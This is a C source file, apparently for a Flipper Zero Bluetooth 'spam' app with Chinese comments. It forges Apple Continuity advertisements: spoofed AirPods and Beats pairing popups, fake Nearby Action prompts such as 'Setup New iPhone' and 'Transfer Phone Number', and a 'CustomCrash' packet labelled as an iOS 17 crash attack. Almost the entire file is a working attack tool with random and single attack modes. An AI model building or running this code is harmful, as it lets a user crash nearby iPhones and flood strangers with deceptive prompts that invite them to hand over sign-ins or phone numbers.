#include "ble_spam.h"
#include <furi_hal_random.h>
#include <string.h>

// =============================================================================
// Apple Continuity 協議
// =============================================================================
// 參考: https://github.com/furiousMAC/continuity
//
// Continuity 廣播使用 Manufacturer Specific Data (0xFF)
// Company ID: 0x004C (Apple, Inc.)
//
// Continuity Type:
//   0x05: AirDrop
//   0x07: Proximity Pair (AirPods, Apple Watch)
//   0x09: AirPlay Target
//   0x0C: Handoff
//   0x0E: Tethering Source
//   0x0F: Nearby Action (通知類)
//   0x10: Nearby Info
//   0xFF: Custom Crash (iOS 17 崩潰)
// =============================================================================

// =============================================================================
// Proximity Pair (AirPods/Apple Watch) 設備列表
// =============================================================================
static const struct {
    uint16_t model;
    const char* name;
    const uint8_t* colors;
    uint8_t colors_count;
} g_pp_models[] = {
    {0x0E20, "AirPods Pro",         (uint8_t[]){0x00}, 1},
    {0x0A20, "AirPods Max",         (uint8_t[]){0x00, 0x02, 0x03, 0x0F, 0x11}, 5},
    {0x0055, "AirTag",              (uint8_t[]){0x00}, 1},
    {0x0030, "Hermes AirTag",       (uint8_t[]){0x00}, 1},
    {0x0220, "AirPods",             (uint8_t[]){0x00}, 1},
    {0x0F20, "AirPods 2nd Gen",     (uint8_t[]){0x00}, 1},
    {0x1320, "AirPods 3rd Gen",     (uint8_t[]){0x00}, 1},
    {0x1420, "AirPods Pro 2nd Gen", (uint8_t[]){0x00}, 1},
    {0x1020, "Beats Flex",          (uint8_t[]){0x00, 0x01}, 2},
    {0x0620, "Beats Solo 3",        (uint8_t[]){0x00, 0x01, 0x06, 0x07, 0x08, 0x09, 0x0E, 0x0F, 0x12, 0x13, 0x14, 0x15, 0x1D, 0x20, 0x21, 0x22, 0x23, 0x25, 0x2A, 0x2E, 0x3D, 0x3E, 0x3F, 0x40, 0x5B, 0x5C}, 26},
    {0x0320, "Powerbeats 3",        (uint8_t[]){0x00, 0x01, 0x0B, 0x0C, 0x0D, 0x12, 0x13, 0x14, 0x15, 0x17}, 10},
    {0x0B20, "Powerbeats Pro",      (uint8_t[]){0x00, 0x02, 0x03, 0x04, 0x05, 0x06, 0x0B, 0x0D}, 8},
    {0x0C20, "Beats Solo Pro",      (uint8_t[]){0x00, 0x01}, 2},
    {0x1120, "Beats Studio Buds",   (uint8_t[]){0x00, 0x01, 0x02, 0x03, 0x04, 0x06}, 6},
    {0x0520, "Beats X",             (uint8_t[]){0x00, 0x01, 0x02, 0x05, 0x1D, 0x25}, 6},
    {0x0920, "Beats Studio 3",      (uint8_t[]){0x00, 0x01, 0x02, 0x03, 0x18, 0x19, 0x25, 0x26, 0x27, 0x28, 0x29, 0x42, 0x43}, 13},
    {0x1720, "Beats Studio Pro",    (uint8_t[]){0x00, 0x01}, 2},
    {0x1220, "Beats Fit Pro",       (uint8_t[]){0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09}, 10},
    {0x1620, "Beats Studio Buds+",  (uint8_t[]){0x00, 0x01, 0x02, 0x03, 0x04}, 5},
};

// =============================================================================
// Nearby Action 類型 (觸發通知)
// =============================================================================
static const struct {
    uint8_t action;
    const char* name;
} g_na_actions[] = {
    {0x13, "AppleTV AutoFill"},
    {0x24, "Apple Vision Pro"},
    {0x05, "Apple Watch"},
    {0x27, "AppleTV Connecting..."},
    {0x20, "Join This AppleTV?"},
    {0x19, "AppleTV Audio Sync"},
    {0x1E, "AppleTV Color Balance"},
    {0x09, "Setup New iPhone"},
    {0x2F, "Sign in to other device"},
    {0x02, "Transfer Phone Number"},
    {0x0B, "HomePod Setup"},
    {0x01, "Setup New AppleTV"},
    {0x06, "Pair AppleTV"},
    {0x0D, "HomeKit AppleTV Setup"},
    {0x2B, "AppleID for AppleTV?"},
};

// =============================================================================
// 構建 Continuity 數據包
// =============================================================================
static uint8_t continuity_build_packet(uint8_t* _size, uint8_t** _packet, AttackConfig* config) {
    ContinuityCfg* cfg = &config->config.continuity;
    
    // 選擇類型
    ContinuityType type;
    if(config->mode == AttackMode_Random) {
        ContinuityType types[] = {
            Continuity_ProximityPair,
            Continuity_NearbyAction,
            Continuity_CustomCrash
        };
        type = types[rand() % 3];
    } else if(config->mode == AttackMode_Single) {
        ContinuityType types[] = {
            Continuity_ProximityPair,
            Continuity_NearbyAction,
        };
        type = types[rand() % 2];
    } else {
        type = cfg->type;
    }
    
    // 計算包大小
    uint8_t header_size = 6;  // Size + AD Type + Company ID + Continuity Type + Continuitiy Size
    uint8_t payload_size = 0;
    
    switch(type) {
        case Continuity_AirDrop: payload_size = 18; break;
        case Continuity_ProximityPair: payload_size = 25; break;
        case Continuity_AirplayTarget: payload_size = 6; break;
        case Continuity_Handoff: payload_size = 14; break;
        case Continuity_TetheringSource: payload_size = 6; break;
        case Continuity_NearbyAction: payload_size = 5; break;
        case Continuity_NearbyInfo: payload_size = 5; break;
        case Continuity_CustomCrash: payload_size = 11; break;
        default: payload_size = 5; break;
    }
    
    uint8_t total_size = header_size + payload_size;
    uint8_t* packet = malloc(total_size);
    uint8_t i = 0;
    
    // 構建 header
    packet[i++] = total_size - 1;  // Length (不包括長度字節自己)
    packet[i++] = 0xFF;             // AD Type: Manufacturer Specific
    packet[i++] = 0x4C;             // Company ID (Apple, little-endian)
    packet[i++] = 0x00;
    packet[i++] = (uint8_t)type;   // Continuity Type
    packet[i++] = payload_size;     // Continuity Payload Size
    
    // 構建 payload
    switch(type) {
    case Continuity_ProximityPair: {
        // 選擇設備和顏色
        uint8_t model_idx = rand() % (sizeof(g_pp_models) / sizeof(g_pp_models[0]));
        uint16_t model = g_pp_models[model_idx].model;
        uint8_t color_idx = rand() % g_pp_models[model_idx].colors_count;
        uint8_t color = g_pp_models[model_idx].colors[color_idx];
        
        packet[i++] = 0x01;  // Prefix (paired)
        packet[i++] = (model >> 8) & 0xFF;
        packet[i++] = model & 0xFF;
        packet[i++] = 0x55;  // Status
        packet[i++] = ((rand() % 10) << 4) | (rand() % 10);  // Battery
        packet[i++] = ((rand() % 8) << 4) | (rand() % 10);   // Charging + Case
        packet[i++] = rand() % 256;  // Lid open counter
        packet[i++] = color;         // Color
        packet[i++] = 0x00;
        // 16 bytes 加密 payload
        furi_hal_random_fill_buf(&packet[i], 16);
        i += 16;
        break;
    }
    
    case Continuity_NearbyAction: {
        uint8_t action_idx = rand() % (sizeof(g_na_actions) / sizeof(g_na_actions[0]));
        uint8_t action = g_na_actions[action_idx].action;
        uint8_t flags = 0xC0;
        
        packet[i++] = flags;
        packet[i++] = action;
        furi_hal_random_fill_buf(&packet[i], 3);
        i += 3;
        break;
    }
    
    case Continuity_CustomCrash: {
        // iOS 17 崩潰攻擊
        uint8_t action_idx = rand() % (sizeof(g_na_actions) / sizeof(g_na_actions[0]));
        uint8_t action = g_na_actions[action_idx].action;
        
        i -= 2;  // 覆寫 header
        packet[i++] = Continuity_NearbyAction;
        packet[i++] = 5;
        packet[i++] = 0xC0;
        packet[i++] = action;
        furi_hal_random_fill_buf(&packet[i], 3);
        i += 3;
        
        packet[i++] = 0x00;  // Terminator
        packet[i++] = 0x00;
        
        packet[i++] = Continuity_NearbyInfo;
        furi_hal_random_fill_buf(&packet[i], 3);
        i += 3;
        break;
    }
    
    case Continuity_AirDrop: {
        memset(&packet[i], 0, 7);  // Zero fields
        i += 7;
        packet[i++] = 0x01;  // Version
        for(int j = 0; j < 10; j++) {
            packet[i++] = rand() % 256;  // AppleID, Phone, Email
        }
        packet[i++] = 0x00;
        break;
    }
    
    case Continuity_AirplayTarget:
    case Continuity_Handoff:
    case Continuity_TetheringSource:
    case Continuity_NearbyInfo:
        for(int j = 0; j < payload_size; j++) {
            packet[i++] = rand() % 256;
        }
        break;
        
    default:
        break;
    }
    
    *_size = total_size;
    *_packet = packet;
    return total_size;
}

// =============================================================================
// 獲取設備名稱
// =============================================================================
static const char* continuity_get_name(uint32_t index) {
    if(index >= sizeof(g_pp_models) / sizeof(g_pp_models[0])) {
        return "Unknown";
    }
    return g_pp_models[index].name;
}

static uint32_t continuity_get_count(void) {
    return sizeof(g_pp_models) / sizeof(g_pp_models[0]);
}

// =============================================================================
// 協議驅動
// =============================================================================
const ProtocolDriver g_protocol_continuity = {
    .name = "Apple Continuity",
    .short_name = "Apple",
    .is_active = true,
    .build_packet = continuity_build_packet,
    .get_device_name = continuity_get_name,
    .get_device_count = continuity_get_count,
    .init = NULL,
    .deinit = NULL,
};